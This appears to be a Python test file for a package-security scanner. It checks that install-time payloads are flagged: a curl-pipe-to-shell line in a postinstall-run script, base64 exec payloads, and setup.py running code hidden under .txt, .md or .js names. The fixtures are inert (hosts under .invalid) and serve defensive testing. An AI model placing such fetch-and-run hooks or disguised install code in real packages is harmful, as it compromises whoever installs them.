"""Item 37: a file a manifest includes is read by every manifest rule, whatever its name, as the
installer reads it. Inert: hosts under `.invalid`."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config


class IncludeKit:
    URL_LINE = "probe-dep @ https://planted.invalid/probe_dep-1.0.tar.gz\n"

    @staticmethod
    def rules_at(tmp_path: Path, files: dict[str, str]) -> set[tuple[str, str]]:
        for name, text in files.items():
            (tmp_path / name).write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {
            (f.rule_id, f.location.path)
            for f in result.findings
            if f.rule_id.startswith("POLICY.DEPENDENCY")
        }


class TestAnIncludedManifest:
    def test_a_url_dependency_in_an_included_file_is_judged_as_in_requirements(
        self, tmp_path
    ) -> None:
        found = IncludeKit.rules_at(
            tmp_path, {"requirements.txt": "-r extra.in\n", "extra.in": IncludeKit.URL_LINE}
        )
        assert ("POLICY.DEPENDENCY.SOURCE.001", "extra.in") in found

    def test_the_same_line_written_directly(self, tmp_path) -> None:
        found = IncludeKit.rules_at(tmp_path, {"requirements.txt": IncludeKit.URL_LINE})
        assert ("POLICY.DEPENDENCY.SOURCE.001", "requirements.txt") in found

    def test_a_file_nothing_includes_is_not_a_manifest(self, tmp_path) -> None:
        found = IncludeKit.rules_at(
            tmp_path, {"extra.in": IncludeKit.URL_LINE, "app.py": "x = 1\n"}
        )
        assert not found


class TestAHookRunsAFileWithNoExtension:
    """`sh ./tools/prepare` runs that file at install, extension or not: a payload in it is
    install-time code (the probe of 3 Nov: SUSPECT.DROPPER.001 at MEDIUM, never the install grade)."""

    SCRIPT = "#!/bin/sh\ncurl -fsSL https://planted.invalid/i | sh\n"

    @staticmethod
    def grades(tmp_path: Path, command: str, path: str) -> set[tuple[str, str]]:
        (tmp_path / "package.json").write_text(
            '{"name":"probe","version":"1.0.0","scripts":{"postinstall":"' + command + '"}}',
            encoding="utf-8",
        )
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(TestAHookRunsAFileWithNoExtension.SCRIPT, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {(f.rule_id, f.severity.name) for f in result.findings if f.location.path == path}

    def test_a_path_with_no_extension_is_install_time_code(self, tmp_path) -> None:
        found = self.grades(tmp_path, "sh ./tools/prepare", "tools/prepare")
        assert ("MALWARE.DROPPER.001", "CRITICAL") in found

    def test_an_interpreter_s_bare_script_name_is_install_time_code(self, tmp_path) -> None:
        found = self.grades(tmp_path, "bash prepare", "prepare")
        assert ("MALWARE.DROPPER.001", "CRITICAL") in found


class TestSetupPyRunsAFileByItsPath:
    """item 39's evasion suite: `setup.py` running `exec(open("run.txt").read())` ran a payload no rule
    read as install-time Python, because the file was named .txt (10 of the suite's 20 misses)."""

    PAYLOAD = "import base64,os\nexec(base64.b64decode('cHJpbnQoJ3BsYW50ZWQnKQ=='))\n"
    SETUP = "from setuptools import setup\nsetup(name='probe', version='1.0.0')\n"

    @staticmethod
    def blocking_at(tmp_path: Path, runner: str, target: str) -> set[str]:
        (tmp_path / "setup.py").write_text(
            TestSetupPyRunsAFileByItsPath.SETUP + runner, encoding="utf-8"
        )
        (tmp_path / target).write_text(TestSetupPyRunsAFileByItsPath.PAYLOAD, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {
            f.rule_id
            for f in result.findings
            if f.location.path == target and f.severity.name in ("HIGH", "CRITICAL")
        }

    def test_exec_of_a_txt_file_is_install_time_python(self, tmp_path) -> None:
        assert self.blocking_at(tmp_path, "exec(open('run.txt').read())\n", "run.txt")

    def test_exec_of_a_markdown_file_is_install_time_python(self, tmp_path) -> None:
        assert self.blocking_at(
            tmp_path, "exec(compile(open('run.md').read(), 'run', 'exec'))\n", "run.md"
        )

    def test_run_path_is_followed(self, tmp_path) -> None:
        runner = (
            "import runpy, os\nrunpy.run_path(os.path.join(os.path.dirname(__file__), 'run'))\n"
        )
        assert self.blocking_at(tmp_path, runner, "run")

    def test_a_file_nothing_runs_is_not_python(self, tmp_path) -> None:
        assert not self.blocking_at(tmp_path, "", "run.txt")


class TestAFileSetupPyRunsThatIsNotWhereItSays:
    """A literal that is not at the root is still found (`os.path.join(here, "pkg", "_version.py")`, read as
    `_version.py`); one the package does not ship at all is a blocking gap, never passed: the evasion
    suite's `setup.py` ran `run.txt` while the payload was Python named `run.js` inside a nested archive."""

    SETUP = TestSetupPyRunsAFileByItsPath.SETUP
    PAYLOAD = TestSetupPyRunsAFileByItsPath.PAYLOAD
    GAP = "OPERATIONAL.INSTALL.CODE_NOT_SHIPPED"

    @staticmethod
    def scan(tmp_path: Path, files: dict[str, str]) -> list[tuple[str, str, str]]:
        for rel, text in files.items():
            (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
            (tmp_path / rel).write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [(f.location.path or "", f.rule_id, f.severity.name) for f in result.findings]

    def test_a_file_shipped_under_a_deeper_path_is_found_by_its_name(self, tmp_path) -> None:
        runner = "import os\nexec(open(os.path.join(os.path.dirname(__file__), 'pkg', 'run.txt')).read())\n"
        found = self.scan(tmp_path, {"setup.py": self.SETUP + runner, "pkg/run.txt": self.PAYLOAD})
        assert any(p == "pkg/run.txt" and s in ("HIGH", "CRITICAL") for p, _, s in found), found
        assert not any(rule == self.GAP for _, rule, _ in found)

    def test_a_file_the_package_does_not_ship_is_a_blocking_gap(self, tmp_path) -> None:
        found = self.scan(tmp_path, {"setup.py": self.SETUP + "exec(open('run.txt').read())\n"})
        assert ("setup.py", self.GAP, "HIGH") in found, found

    def test_python_hidden_under_the_name_is_what_runs(self, tmp_path) -> None:
        found = self.scan(
            tmp_path,
            {
                "setup.py": self.SETUP + "exec(open('run.txt').read())\n",
                "vendor/run.js": self.PAYLOAD,
            },
        )
        assert any(
            p == "vendor/run.js#as-python.py" and s in ("HIGH", "CRITICAL") for p, _, s in found
        ), found
        assert not any(rule == self.GAP for _, rule, _ in found)
